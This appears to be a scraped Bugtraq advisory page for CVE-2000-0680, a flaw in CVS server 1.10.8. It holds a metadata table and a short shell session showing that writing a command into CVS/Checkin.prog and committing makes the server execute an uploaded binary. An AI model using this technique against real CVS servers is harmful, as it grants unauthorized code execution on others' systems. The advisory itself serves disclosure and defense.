@@ -1,0 +1,97 @@
+#bid1524<p><b><span style="font-size: 18pt;">CVS Checkin.prog Binary Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1524/info">info</a><br><a href="http://www.securityfocus.com/bid/1524/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1524/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1524/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1524/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1524
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2000-0680<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 28 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 02:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Posted to BugTraq on July 28, 2000 by Tanaka Akira &lt;akr@m17n.org&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					CVS Kit CVS Server 1.10 .8<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	% cvs -d :pserver:test@localhost:/tmp/cvs -f co somemodule <br/>cvs server: Updating somemodule<br/>% cd somemodule <br/>% cp /bin/ls binary<br/>% cvs add -kb binary <br/>cvs server: scheduling file `binary' for addition<br/>cvs server: use 'cvs commit' to add this file permanently<br/>% echo ./binary &amp;gt; CVS/Checkin.prog<br/>% cvs commit -m 'test'<br/>cvs commit: Examining .<br/>RCS file: /tmp/cvs/somemodule/binary,v<br/>done<br/>Checking in binary;<br/>/tmp/cvs/somemodule/binary,v  &amp;lt;--  binary<br/>initial revision: 1.1<br/>done<br/>cvs server: Executing ''./binary' '/tmp/cvs/somemodule''<br/>#cvs.lock<br/>#cvs.wfl.serein.m17n.org.14330<br/>binary,v
+	
+		<ul>
+</ul>
+</div>
